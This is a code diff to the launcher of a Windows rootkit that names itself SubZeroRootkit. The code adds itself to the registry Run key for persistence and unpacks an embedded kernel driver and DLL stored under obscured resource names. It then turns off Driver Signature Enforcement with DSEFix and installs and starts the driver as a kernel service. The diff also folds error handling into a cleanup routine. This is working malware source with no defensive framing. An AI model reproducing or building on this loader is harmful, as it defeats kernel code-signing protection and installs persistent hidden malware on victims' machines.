@@ -1,11 +1,14 @@
 #include "pch.h"
 #include "resource.h"
-#include "SubZeroLoaderCommon.h"
+#include "SubZeroLauncherCommon.h"
 #include "../SubZeroDriver/SubZeroCommon.h"
 #include "../SubZeroUtils/AutoRegistryKeyHandle.h"
 #include "../SubZeroUtils/PeResource.h"
 #include "../SubZeroUtils/ServiceManager.h"
 #include "../SubZeroUtils/RegistryManager.h"
+#include "../SubZeroUtils/DebugPrint.h"
+
+#include "../SubZeroCleanup/SubZeroCleanup.h"
 
 extern "C" {
 #include "../DSEFix/DSEFix.h"
@@ -13,23 +16,22 @@ extern "C" {
 
 const std::wstring DRIVER_RESOURCE_NAME(L"PUXY");
 const std::wstring DLL_RESOURCE_NAME(L"NKUI");
+AutoRegistryKeyHandle AutoRegKey(nullptr);
 
-//int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-int wmain(int argc, wchar_t* argv[]) {
-
+int wmain(int argc, wchar_t* argv[])
+{
 	//LoadLibraryA("S:\\Projects\\SubZeroRootkit\\x64\\Release\\SubZeroDLL.dll");
 	//LoadLibraryA("C:\\Users\\Daniel\\Desktop\\Drivers\\SubZero\\Release\\SubZeroDLL.dll");
+	//SubZeroCleanup::Cleanup();
 	//return 1;
-	
-	AutoRegistryKeyHandle autoRegKey(nullptr);
-	
-	try {						
-		autoRegKey.reset(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
 
-		// Set current file as startup file - note that the loader register its current location (argv[0])
-		// but the rest of the modules assume it is in the fixed path - LOADER_FILE_PATH
+	try {						
+		AutoRegKey.reset(RegistryManager::OpenRegistryKey(REG_SZ_KEY_ROOT, REG_RUN_KEY_PATH));
+
+		// Set current file as startup file - note that the launcher register its current location (argv[0])
+		// but the rest of the modules assume it's in the fixed path - LAUNCHER_FILE_PATH
 		const SIZE_T dwLetterSize = sizeof(WCHAR);		
-		RegistryManager::SetRegistryValue(autoRegKey.get(), REG_VALUE_NAME.c_str(), REG_SZ, (PVOID)argv[0], MAX_PATH);
+		RegistryManager::SetRegistryValue(AutoRegKey.get(), REG_VALUE_NAME, REG_SZ, (PVOID)argv[0], MAX_PATH);
 	}
 	catch (const Win32ErrorCodeException& exception) {		
 		DEBUG_PRINT(exception.what());	
@@ -37,33 +39,32 @@ int wmain(int argc, wchar_t* argv[]) {
 	}
 
 	// Save resources to file system
-	try {		 
+	try {
 		const PeResource driverResource(IDR_PUXY1, DRIVER_RESOURCE_NAME);
 		driverResource.saveResourceToFileSystem(DRIVER_FULL_PATH);
 		DEBUG_PRINT("[+] Driver extracted and saved to file system successfully");
 	}
 	catch (const Win32ErrorCodeException& exception) {				
-		if (exception.getErrorCode() != ERROR_FILE_EXISTS) {
-
+		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
+		{
 			// Error extracting/saving resource
 			DEBUG_PRINT(exception.what());
-			RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
+			SubZeroCleanup::Cleanup();
 			return 1;
-		}		
+		}
 	}
-	
+
 	 try {
 		const PeResource libraryResource(IDR_NKUI1, DLL_RESOURCE_NAME);
 		libraryResource.saveResourceToFileSystem(DLL_FULL_PATH);
 		DEBUG_PRINT("[+] DLL extracted and saved to file system successfully");
 	}
 	catch (const Win32ErrorCodeException& exception) {
-		if (exception.getErrorCode() != ERROR_FILE_EXISTS) {
-
+		if (ERROR_FILE_EXISTS != exception.getErrorCode()) 
+		{
 			// Error extracting/saving resource
 			DEBUG_PRINT(exception.what());
-			RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
-			::DeleteFileW(DRIVER_FULL_PATH.c_str());
+			SubZeroCleanup::Cleanup();
 			return 1;
 		}
 	}
@@ -73,18 +74,15 @@ int wmain(int argc, wchar_t* argv[]) {
 	DEBUG_PRINT("[+] DSE protection disabled");
 
 	// Load rootkit
-	try {		
+	try {
 		ServiceManager serviceManager(DRIVER_NAMEW, DRIVER_FULL_PATH, SERVICE_KERNEL_DRIVER);
 		serviceManager.installAndStart();
 		DEBUG_PRINT("[+] Driver installed and started successfully");
 	}
 	catch (const Win32ErrorCodeException& exception) {
-		DEBUG_PRINT(exception.what());		
-		RegistryManager::DeleteRegistryValue(autoRegKey.get(), DRIVER_NAMEW);
-		::DeleteFileW(DRIVER_FULL_PATH.c_str());
-		::DeleteFileW(DLL_FULL_PATH.c_str());
+		DEBUG_PRINT(exception.what());
+		SubZeroCleanup::Cleanup();
 		return 1;
 	}
-
 	return 0;
 }
